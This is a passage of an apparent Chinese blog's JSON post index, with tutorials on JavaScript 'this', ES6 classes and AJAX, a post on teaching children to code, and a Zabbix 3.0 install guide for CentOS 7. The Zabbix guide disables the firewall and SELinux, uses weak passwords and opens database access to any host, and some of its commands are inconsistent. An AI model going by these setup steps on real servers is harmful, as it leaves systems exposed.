click...&quot;); &#125;, 2000); //debounce用于将相同的操作积累到一起再触发，节省性能 function debounce(fn, delay) &#123; var timer = null; return function () &#123; clearTimeout(timer); timer = setTimeout(function () &#123; return fn.apply(this, arguments); &#125;, delay); &#125; &#125; &lt;/script&gt;","categories":[],"tags":[]},{"title":"如何让小孩学习javascript","slug":"如何让小孩学习javascript","date":"2018-11-07T06:10:39.000Z","updated":"2023-02-23T03:30:13.100Z","comments":true,"path":"2018/11/07/如何让小孩学习javascript/","link":"","permalink":"https://harrypangpang.github.io/2018/11/07/%E5%A6%82%E4%BD%95%E8%AE%A9%E5%B0%8F%E5%AD%A9%E5%AD%A6%E4%B9%A0javascript/","excerpt":"","text":"最近少儿编程培训好像有点热了，开发思维，兴趣爱好等培训班的各类理由让家长不由动心。对于不会编程的家长来说，这是一个不错的学习平台，我也研究过一段时间，确实不错，对小孩的各方面能力都有一定程度的提高， 但对于程序员，我觉得还是尽量自己来教，毕竟还能给小孩充分的沟通和陪伴时间，也能给自己不小的启发和进步。 所以我最近看到一些不错的JS学习资源，可以提高小孩的学习兴趣，当然这些学习网站也同样适用于成人，因为的确是不错的资源。 首先，如果你的小孩没有接触过任何编程，可以通过scratch或者scratchjr(平板版的scratch)来入门，别担心，都是一些简单有趣的动画，也没有很复杂的语法，对小孩理解编程思想很有用。官网和其他网站都有大量的实例和教学，社区也很友好。 下面就进入正题啦 ##用Code Combat来过渡javascript 让一个小孩系统的学习他们的第一种编程语言的网站就是 Code Combat，它支持python和javascript。 这个平台通过一种让小孩通过游戏的方式学习代码，让孩子通过javascript解决谜题，打败怪兽。甚至对我们成年人来说也是非常有趣的。虽然游戏的方式使他有趣，但是他也有短板，不够深入，但用来入门和培养兴趣还是不错的。 ###非结构化的js编程 为了让小孩开始他们的第一个javascript应用，我们可以通过 Codepen或者 JS Fiddle这样的在线编辑器而非专业性的编辑器类似webstorm等。当然，大多数程序员都知道这些在线网站。我们可以让孩子从简单的开始，比如dom操作，数字生成器，简单的计算器等。大多数孩子都喜欢交互式的，图形化的东西，这都非常时候只需要浏览器的javascript! JS With PlayCanvas来提升 对于我们的更高级的学生，一个很酷的选择就是一个三维引擎 Play Canvas。当你说“三维”时，你已经钓了90%个孩子，如果你加上“游戏引擎”，你就成功了！Play Canvas支持刚体物理模拟，处理三维音频(没错！)，三维动画，和大量其他东西，如果你有时间看它。它有一套很好的教程，你一定要看看。 当你快速过滤这个网站，一些实例或甚至只是阅读官方说明，你会感觉到这对于孩子是否太难了。该工具本身可以是一个陡峭的坡道，特别是对于孩子们，所以我们在平衡工具学习和学习的时候总是很谨慎。家长可能需要为一些孩子做一些准备工作-从零开始创建一个三维应用程序对于大多数孩子来说都是相当困难的。 好啦，今天介绍到这里，如果有不理解的欢迎私信留言，我会一一回的。 参考原文","categories":[],"tags":[]},{"title":"如何理解es6中的class以及class中的constructor函数","slug":"如何理解es6中的class以及class中的constructor函数","date":"2018-06-17T06:06:08.000Z","updated":"2023-02-23T03:30:13.100Z","comments":true,"path":"2018/06/17/如何理解es6中的class以及class中的constructor函数/","link":"","permalink":"https://harrypangpang.github.io/2018/06/17/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3es6%E4%B8%AD%E7%9A%84class%E4%BB%A5%E5%8F%8Aclass%E4%B8%AD%E7%9A%84constructor%E5%87%BD%E6%95%B0/","excerpt":"","text":"首先，“语法糖”的意思是现有技术本可以实现，但是采用某种写法会更加简洁优雅。最常见的就是声明对象采用的就是语法糖 var a={b:111}。 ES6的class可以看作只是一个语法糖，它的绝大部分功能，ES5都可以做到，新的class写法只是让对象原型的写法更加清晰、更像面向对象编程的语法而已。 function Point(x, y) &#123; this.x = x; this.y = y; &#125; Point.prototype.toString = function () &#123; return &#x27;(&#x27; + this.x + &#x27;, &#x27; + this.y + &#x27;)&#x27;; &#125;; 等同于 class Point &#123; constructor(x, y) &#123; this.x = x; this.y = y; &#125; toString() &#123; return &#x27;(&#x27; + this.x + &#x27;, &#x27; + this.y + &#x27;)&#x27;; &#125; &#125; 在constructor中必须调用 super方法，子类没有自己的this对象，而是继承父类的this对象，然后对其进行加工。super代表了父类构造函数。对于你的实例相当于执行Component(props)。但是注意，此处this指向 子类。更严谨的是相当于 Component.prototype.constructor.call(this,props)。","categories":[],"tags":[]},{"title":"看懂js中this关键字的指向问题","slug":"看懂js中this关键字的指向问题","date":"2018-04-06T06:07:13.000Z","updated":"2023-02-23T03:30:13.100Z","comments":true,"path":"2018/04/06/看懂js中this关键字的指向问题/","link":"","permalink":"https://harrypangpang.github.io/2018/04/06/%E7%9C%8B%E6%87%82js%E4%B8%ADthis%E5%85%B3%E9%94%AE%E5%AD%97%E7%9A%84%E6%8C%87%E5%90%91%E9%97%AE%E9%A2%98/","excerpt":"","text":"this总是指向函数的直接调用者（而非间接调用者）；如果有new关键字，this指向new出来的那个对象；在事件中，this指向触发这个事件的对象，特殊的是，IE中的attachEvent中的this总是指向全局对象Window； 通俗的讲，因为ｔｈｉｓ只存在于函数中，而函数是需要被调用的，然后ｔｈｉｓ是谁（对象）调用函数就指向谁（对象）。下面我们看看不同情况下的ｔｈｉｓ指向情况。 １）单纯的函数调用 function test()&#123; this.x = 1; alert(this.x)／／结果为：１ &#125;; test();／／这里window调用了test函数， window.x即this.x alert(this.x) ;／／结果为：１ alert(&#x27;x&#x27; in window);／／结果为：true `` ２）函数作为对象的方法调用 var test = { a:1, b:function(){ alert(this.a); } }; test.b();／／结果为：1 test调用了函数b，this指向test alert(this.a);//结果为：undefined window调用了alert函数，this指向 window而window里并没有a这个属性。 注：在非严格模式下，this没有正确指向，则指向window对象，在严格模式下，没有正确指向，为 undefined。默认就是非严格模式。 3)作为构造函数调用 function test()&#123; this.a = 1; &#125;; var test2 = new test(); alert(test2.a);//结果为：1 这里this指向的是构造的新对象，也就是 test2，所以test2也有了属性a并等于1。 4)apply()、call() 调用 var a = 0, test1 = &#123; a:1, fun:function()&#123; alert(this.a); &#125; &#125;, test2 = &#123; a:2 &#125;; test1.fun();//结果为：1 test1.fun.call(test2);//结果为：2 test1.fun.call();//结果为：0 这里的三次调用，this分别指向test1、test2和window。第一种前面已经提到了，第二种是通过call或者apply方法使fun中原本指向test1的this变成了指向test2（即call、apply方法的第一个参数）。第三种情况属于第一个参数为空（好像为undefined时也会指向window）时，会默认指向window，..call() =》 ..call(window)。","categories":[],"tags":[]},{"title":"zabbix平台搭建","slug":"zabbix平台搭建","date":"2018-03-14T06:06:45.000Z","updated":"2023-02-23T03:30:13.098Z","comments":true,"path":"2018/03/14/zabbix平台搭建/","link":"","permalink":"https://harrypangpang.github.io/2018/03/14/zabbix%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/","excerpt":"","text":"最近给公司搞了个zabbix平台监测，不得不说，网上的文章太杂了 下面是我使用成功在centos7安装zabbix 3.11.4的命令 1.1 安装依赖包： yum -y install wget net-snmp-devel OpenIPMI-devel httpd openssl-devel java lrzsz fping-devel libcurl-devel perl-DBI pcre-devel libxml2 libxml2-devel mysql-devel gcc php php-bcmath php-gd php-xml php-mbstring php-ldap php-mysql.x86_64 php-pear php-xmlrpc net-tools wget vim-enhanced 1.2 关闭防火墙： # systemctl stop firewalld.service # systemctl disable firewalld.service 需要关闭 selinux，一定要关闭这个，开启selinux会引起一连串问题，甚至zabbix的discovery功能也不能正常使用 # sed -i &quot;s/SELINUX=enforcing/SELINUX=disabled/g&quot; /etc/selinux/config 确认是否修改成功 # grep SELINUX /etc/selinux/config 然后重启系统即可 # reboot 2.1 搭建lamp环境 在centos7上安装zabbix server3.0之前，我们首先搭建zabbix所需要的lamp环境。 下载最新的yum源，如下： # wget -P /etc/yum.repos.d http://mirrors.aliyun.com/repo/Centos-7.repo 在开始安装之前，还需要说明下centos7自带的mysql是mariadb，我们可以通过如下命令查看： yum search mysql|tac 现在开始安装lamp环境，使用如下命令： yum -y install mariadb mariadb-server php php-mysql httpd 通过上图，我们可以很明显的看出centos7默认安装的是php5.4、httpd2.4和maradb5.5，这个完全符合zabbix3.0对软件版本的要求。 lamp安装完毕后，我们现在来配置mysql数据库。 设置开机自启动mysql，并启动mysql，使用如下命令： [root@zabbix ~]# systemctl enable mariadb.service [root@zabbix ~]# systemctl start mariadb.service 初始化mysql数据库，并配置root用户密码。使用如下命令： [root@zabbix ~]# mysql_secure_installation 注意：在上图中的Enter current passwdord for root处，我们直接敲回车键即可。因为centos7上mysql的默认root用户密码为空。 上图中主要是为root用户配置密码，并刷新相关权限。（密码设为123456，只为实验用，生产环境自定义） Remove anonymous users? 删除匿名用户？ Disallow root login remotely? 禁止root远程登陆 Remove test database and access to it? 删除测试数据库并且和访问它 Reload privilege tables now? 重新载入特权表 上图中主要是配置匿名用户、test用户以及root用户远程连接等相关配置。 mysql初始化完毕后，我们现在来创建zabbix数据库及其用户，使用如下命令： [root@zabbix ~]# mysql -uroot -p123456 -e &quot;create database zabbix default character set utf8 collate utf8_bin;&quot; [root@zabbix ~]# mysql -uroot -p123456 -e &quot;grant all on zabbix.* to &quot;zabbix&quot;@&quot;%&quot; identified by &quot;zabbix&quot;;&quot; 现在来测试刚刚创建的zabbix用户，是否可以连接mysql数据库，如下： [root@zabbix ~]# mysql -uzabbix -pzabbix MariaDB [(none)]&gt; show databases; MariaDB [(none)]&gt; quit 通过上图，我们可以很明显的看出zabbix用户是可以正常连接数据库的。 启动apache以及开放80端口，如下： [root@zabbix ~]# systemctl start httpd.service [root@zabbix ~]# netstat -ltun 到此lamp环境已经全部搭建完毕。 浏览器输入IP地址即可看到如下 2.2 服务器端安装zabbix server3.0（zabbix server） lamp环境搭建完毕后，我们现在开始正式安装zabbix3.0。 安装zabbix3.0所需要EPEL源和zabbix的yum源，如下： #rpm -ivh https://mirrors.aliyun.com/centos/6.9/extras/x86_64/Packages/epel-release-6-8.noarch.rpm ```` ![image.png](https://user-gold-cdn.xitu.io/2018/12/21/167cf28a26598a68?w=500&amp;h=65&amp;f=png&amp;s=33448) #rpm -ivh http://repo.zabbix.com/zabbix/3.0/rhel/7/x86_64/zabbix-release-3.0-1.el7.noarch.rpm ![image.png](https://user-gold-cdn.xitu.io/2018/12/21/167cf28a2704d6e7?w=825&amp;h=98&amp;f=png&amp;s=5156) 以上安装完毕后，我们现在来正式安装zabbix3.0，使用如下命令： [root@zabbix ~]# yum -y install zabbix-server-mysql zabbix-web-mysql zabbix-get ![image.png](https://user-gold-cdn.xitu.io/2018/12/21/167cf28a309e3504?w=814&amp;h=304&amp;f=png&amp;s=31892) ![image.png](https://user-gold-cdn.xitu.io/2018/12/21/167cf28a3d3b20be?w=827&amp;h=129&amp;f=png&amp;s=4702) 通过上图，我们可以很明显的看出目前zabbix server是3.0.5版本的。 以上安装完毕后，我们现在开始进行zabbix的相关配置。 导入zabbix数据库结构，如下： [root@zabbix ~]# cd /usr/share/doc/zabbix-server-mysql-3.0.5/ [root@zabbix zabbix-server-mysql-3.0.5]# zcat create.sql.gz | mysql -uroot -pDe123456 zabbix ![image.png](https://user-gold-cdn.xitu.io/2018/12/21/167cf28a3e070b44?w=732&amp;h=67&amp;f=png&amp;s=3377) 数据库导入完毕后，我们现在来修改zabbix sever的配置文件，如下：（我们只需要关注 DBHost、DBName、DBUser、 DBPassword 几项即可。这几项是配置zabbix server连接mysql数据库的参数。） [root@zabbix ~]# vi /etc/zabbix/zabbix_server.conf LogFile=/var/log/zabbix/zabbix_server.log LogFileSize=0 PidFile=/var/run/zabbix/zabbix_server.pid DBHost=localhost DBName=zabbix DBUser=zabbix DBPassword=zabbix SNMPTrapperFile=/var/log/snmptrap/snmptrap.log Timeout=4 AlertScriptsPath=/usr/lib/zabbix/alertscripts ExternalScripts=/usr/lib/zabbix/externalscripts LogSlowQueries=3000 以上修改完毕后，我们再来修改下zabbix.conf文件。如下： vi /etc/httpd/conf.d/zabbix.conf Alias /zabbix /usr/share/zabbix Options FollowSymLinks AllowOverride None Require all granted php_value max_execution_time 300 php_value memory_limit 128M php_value post_max_size 16M php_value upload_max_filesize 2M php_value max_input_time 300 php_value always_populate_raw_post_data -1 php_value date.timezone Asia/Shanghai 修改最后一项php_value date.timezone Asia/Shanghai 就行，定义php的时区 以上修改完毕后，我们把把zabbix-server加入开机启动，并启动zabbix-server，如下： [root@zabbix ~]# systemctl start zabbix-server.service [root@zabbix ~]# systemctl enable zabbix-server.service 最后重启apache，如下： [root@zabbix ~]# systemctl restart httpd.service 3.1配置zabbix 登录http://ip/zabbix/setup.php（ip就是你服务器的IP地址） 一开始会有要输入密码的时候，如下 ![image.png](https://user-gold-cdn.xitu.io/2018/12/21/167cf28a48afcfca?w=611&amp;h=231&amp;f=png&amp;s=49591) 输入之前设置的数据库密码即可 接下来，很重要！ 一路next。。。 然后就点登录 默认用户名是Admin 密码 zabbix 然后点击sign in zabbix server端就设置完毕 4.1 配置客户端安装zabbix agent（被监测的服务器） zabbix agent的安装比较简单，我们只需要安装相应的仓库，然后执行安装命令即可。 [root@zabbix ~]# yum clean all [root@zabbix ~]# yum -y install zabbix zabbix-agent ![image.png](https://user-gold-cdn.xitu.io/2018/12/21/167cf28a4c3cf45b?w=500&amp;h=156&amp;f=png&amp;s=64317) ![image.png](https://user-gold-cdn.xitu.io/2018/12/21/167cf28a5aa62ae4?w=629&amp;h=221&amp;f=png&amp;s=54174) 在安装时如出现如上图所示错误，原因是软件这两个版本不一致，仔细观察发现这两个软件包使用了不同的仓库，把epel的关闭(enabled=0，位于/etc/yum.repos.d/epel.repo)再重装 4.2 配置zabbix agent zabbix agent的配置很简单，只需要修改zabbix agent配置文件中的Server、ServerActive和Hostname这三项即可。 其中Server、ServerActive是zabbix server服务器的IP地址，Hostname是被监控端的IP地址，如下： [root@zabbix ~]# vi /etc/zabbix/zabbix_agentd.conf PidFile=/var/run/zabbix/zabbix_agentd.pid LogFile=/var/log/zabbix/zabbix_agentd.log LogFileSize=0 Server=127.0.0.1 ServerActive=127.0.0.1 Hostname=127.0.0.1 Include=/etc/zabbix/zabbix_agentd.d/ 以上配置完毕后，我们在zabbix web端添加该监控机器时，只需要把honst name与该配置文件中的hostname对应即可。如下： Server=服务器ip地址 ServerActive=服务器ip地址 Hostname=客户端ip地址 Server被动ServerActive主动 到此zabbix agent就已经安装完毕。 启动客户端 [root@zabbix ~]# zabbix_agentd -c /etc/zabbix/zabbix_agentd.conf [root@zabbix ~]# systemctl start zabbix-agent [root@zabbix ~]# systemctl restart zabbix-agent [root@zabbix ~]# systemctl enable zabbix-agent 然后在浏览器中根据下面的美图设置 ![image.png](https://user-gold-cdn.xitu.io/2018/12/21/167cf28a61d1df49?w=1240&amp;h=308&amp;f=png&amp;s=96888) 看到第四个了没，ZBX绿了就成功了 点左上角的小人就能设置语言是中文 但是会遇到图标坐标系没有文字的问题如下 ![image.png](https://user-gold-cdn.xitu.io/2018/12/21/167cf28a6cf44eff?w=376&amp;h=212&amp;f=png&amp;s=15317) 解决乱码方法： 把Windows 系统中找到 C:\\Windows\\Fonts 中的楷体（常规）用winscp （百度一下）拷贝到linux根目录 ![image.png](https://user-gold-cdn.xitu.io/2018/12/21/167cf28a6fc86e4a?w=975&amp;h=300&amp;f=png&amp;s=44909) 可以上传到 linux 里面了，接下来把 SIMKAI.TTF 移动到 zabbix 安装目录的 fonts 目录下 [root@zabbix ~]# mv SIMKAI.TTF /usr/share/zabbix/fonts/ 可以直接按照下面的图片设置，然后再看看，是不是搞定了 ![image.png](https://user-gold-cdn.xitu.io/2018/12/21/167cf28a7b02865b?w=610&amp;h=263&amp;f=png&amp;s=6823)","categories":[],"tags":[{"name":"运维","slug":"运维","permalink":"https://harrypangpang.github.io/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"十分钟了解ajax","slug":"十分钟了解ajax","date":"2016-09-06T06:09:16.000Z","updated":"2023-02-23T03:30:13.099Z","comments":true,"path":"2016/09/06/十分钟了解ajax/","link":"","permalink":"https://harrypangpang.github.io/2016/09/06/%E5%8D%81%E5%88%86%E9%92%9F%E4%BA%86%E8%A7%A3ajax/","excerpt":"","text":"ajax其实是实现异步刷新，他的用处是在不重新载入页面的情况下，与与服务器交换数据并更新网页。 看下面的例子,不着急看懂，后面我会详细解释 &lt;span&gt;输入账号&lt;/span&gt; &lt;input id=&quot;name&quot; name=&quot;name&quot; onkeyup=&quot;check()&quot; type=&quot;text&quot;&gt; &lt;span id=&quot;checkResult&quot;&gt;&lt;/span&gt; &lt;script&gt; var xmlhttp; function check()&#123; var name =document.getElementById(&#x27;name&#x27;).value; var url=&quot;/study/checkName.jsp?name=&quot;+name; xmlhttp =new XMLHttpRequest(); xmlhttp.onreadystatechange=checkResult; //响应函数 xmlhttp.open(&quot;GET&quot;,url,true); //设置访问的页面 xmlhttp.send(null); //执行访问 function checkResult()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) document.getElementById(&#x27;checkResult&#x27;).innerHTML=xmlhttp.responseText; &#125; &lt;/script&gt; 第一步：ajax请求的示意图如下，大概了解是怎么走的： 第二步：创建XMLHttpRequest（XHR） XHR是一个javascript对象，他是在幕后通过一个小线程与服务器进行数据交互的，从而实现无刷新效果。 &lt;script&gt; var xmlhttp = new XMLHttpRequest(); documen.write(xmlhttp); &lt;/script&gt; 结果： [object XMLHttpRequest] 第三步：设置响应函数 XHR对象的作用是和服务器进行交互，所以不仅发送消息给服务器，也接受服务器返回的响应。当从服务器返回响应时我们想做点什么该怎么办？ 通过xmlhttp.onreadystatechange=checkResult 就可以指定用checkResult 函数进行处理。 第四步：设置并发出请求 通过open函数设置幕后的小线程，将要访问的url。在本例中就是 /study/checkName.jsp xmlhttp.open(&#x27;GET&#x27;,url,true);//规定请求的类型、URL 以及是否异步处理请求。method：请求的类型；GET 或 POST url：文件在服务器上的位置 async：true（异步）或 false（同步） 通过send函数进行实际的访问 xmlhttp.send(null);//send(string),将请求发送到服务器。 第五步：处理响应信息 在checkResult 函数中处理响应 function checkResult()&#123; if(xmlhttp.readyStats==4 &amp;&amp; xmlhttp.status ==200) document.getElementById(&#x27;checkResult&#x27;).innerHTML=xmlhttp.responseText; &#125; xmlhttp.readyState 4 表示请求已完成 xmlhttp.status 200 表示响应成功 xmlhttp.responseText; 用于获取服务端传回来的文本 document.getElementById(‘checkResult’).innerHTML 设置span的内容为服务端传递回来的文本 再返回来看第一段代码，是不是就理解了呢","categories":[],"tags":[]}],"categories":[],"tags":[{"name":"后端","slug":"后端","permalink":"https://harrypangpang.github.io/tags/%E5%90%8E%E7%AB%AF/"},{"name":"安全","slug":"安全","permalink":"https://harrypangpang.github.io/tags/%E5%AE%89%E5%85%A8/"},{"name":"实践","slug":"实践","permalink":"https://harrypangpang.github.io/tags/%E5%AE%9E%E8%B7%B5/"},{"name":"源码","slug":"源码","permalink":"https://harrypangpang.github.io/tags/%E6%BA%90%E7%A0%81/"},{"name":"日常踩坑","slug":"日常踩坑","permalink":"https://harrypangpang.github.io/tags/%E6%97%A5%E5%B8%B8%E8%B8%A9%E5%9D%91/"},{"name":"运维","slug":"运维","permalink":"https://harrypangpang.github.io/tags/%E8%BF%90%E7%BB%B4/"}]}